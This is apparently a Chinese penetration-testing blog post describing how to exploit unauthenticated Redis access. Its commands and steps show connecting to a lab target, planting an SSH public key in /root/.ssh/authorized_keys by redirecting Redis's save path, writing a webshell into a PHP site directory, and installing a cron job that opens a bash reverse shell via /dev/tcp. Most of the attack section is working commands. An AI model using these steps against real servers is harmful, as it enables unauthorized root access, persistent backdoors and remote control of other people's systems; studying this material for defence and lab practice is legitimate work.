---
title: Redis未授权访问
date: 2019-02-27 14:24:10
tags: 漏洞
categories: 渗透测试
---

# 0x01 漏洞简介
Redis默认配置未配置密码，如果Redis以root用户运行，攻击者可以给root账号写入SSH公钥文件，直接通过SSH免密登录服务器。Redis默认端口为6379端口。若此端口未限制公网访问，会导致Redis服务暴露公网，造成未授权访问。


# 0x02 攻击手段
## 连接测试
已知网络靶场IP为219.153.49.228，Redis端 口为47234，提供了http端口为41481。使用redis客户端进行连接尝试：
```bash
./redis-cli -h 219.153.49.228 -p 47234
```
![](2019-02-27-Redis未授权访问\连接测试.PNG)

## 本地生成公私钥
若Redis以root用户运行，可以直接将本地生成的公钥导入到/root/.ssh/authorized.keys文件中实现免密登录。
```bash
ssh-keygen -t rsa
```
![](2019-02-27-Redis未授权访问\生成公私钥.PNG)

## 公钥写入
由于网络靶场写入/root/.ssh/的权限受限，因此以之前对公司内网测试获取的一台Redis服务器为例。
先将公钥写入文件：
```bash
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > h.txt
```
![](2019-02-27-Redis未授权访问\公钥写入文件.png)

将h.txt的内容写入到redis服务器key为test对应的value中。
```bash
cat h.txt | /usr/redis/./redis-cli -h xxx.xxx.xxx.xxx -p 6389 -x set test
```
![](2019-02-27-Redis未授权访问\写入value.PNG)

设置redis的dbfilename路径为/root/.ssh/authorized_keys，并保存。
```
config set dir /root/.ssh

config set dbfilename authorized_keys

save
```
![](2019-02-27-Redis未授权访问\修改dbfilename.png)

直接使用ssh访问服务器查看权限和文件，可见为root权限用户。
![](2019-02-27-Redis未授权访问\查看权限.png)

## 写入webshell
网络靶场写入/root/.ssh/的权限受限，且存在php站点，因此尝试写入webshell。
设置Redis备份目录为php站点目录：/var/www/html/，文件名任意。
![](2019-02-27-Redis未授权访问\写入webshell.png)

使用浏览器访问webshell，可以正常访问。
![](2019-02-27-Redis未授权访问\连接webshell.png)

## 写入定时任务
同理，将Redis备份目录改为/var/spool/cron，使用nc进行监听反弹shell。
```
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/ip_addr/port 0>&1\n\n"
config set dir /var/spool/cron
config set dbfilename root
```

# 0x03 参考
[Redis未授权访问详解](https://www.freebuf.com/column/158065.html)
